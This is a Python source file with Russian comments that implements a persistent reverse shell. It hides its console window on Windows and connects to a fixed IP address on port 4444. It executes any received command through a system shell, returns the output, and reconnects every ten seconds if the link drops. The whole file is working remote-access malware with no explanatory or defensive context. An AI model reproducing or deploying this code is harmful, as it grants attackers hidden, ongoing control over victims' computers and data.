import socket
import subprocess
import os
import sys
import time
import threading
import ctypes

# Конфигурация
HOST = '192.168.0.243'
PORT = 4444
RECONNECT_DELAY = 10  # Пауза между переподключениями в секундах

def hide_console():
    if sys.platform.startswith('win'):
        try:
            kernel32 = ctypes.WinDLL('kernel32')
            user32 = ctypes.WinDLL('user32')
            hWnd = kernel32.GetConsoleWindow()
            if hWnd:
                user32.ShowWindow(hWnd, 0)  # 0 = SW_HIDE
        except:
            pass

def reliable_send(s, data):
    try:
        pkt = f"{len(data):<4}{data}".encode()
        s.sendall(pkt)
    except:
        pass

def reliable_recv(s):
    data = b""
    try:
        raw_len = s.recv(4)
        if not raw_len:
            return None
        data_len = int(raw_len.decode().strip())
        
        while len(data) < data_len:
            packet = s.recv(data_len - len(data))
            if not packet:
                return None
            data += packet
    except:
        return None
    return data.decode()

def execute_command(cmd):
    try:
        result = subprocess.check_output(
            cmd,
            stderr=subprocess.STDOUT,
            shell=True,
            timeout=30
        )
        return result.decode(errors='ignore')
    except subprocess.CalledProcessError as e:
        return e.output.decode(errors='ignore')
    except:
        return "Command execution failed\r\n"

def reverse_shell_session(s):
    try:
        while True:
            cmd = reliable_recv(s)
            if cmd is None:
                break
                
            if cmd.lower() == 'exit':
                break
                
            if cmd.lower() == 'background':
                continue
                
            result = execute_command(cmd)
            reliable_send(s, result)
            
    except Exception as e:
        pass
    finally:
        s.close()

def main():
    hide_console()
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            s.connect((HOST, PORT))
            
            reverse_shell_session(s)
            
        except (socket.error, KeyboardInterrupt):
            pass
        except Exception as e:
            pass
            
        time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    main()
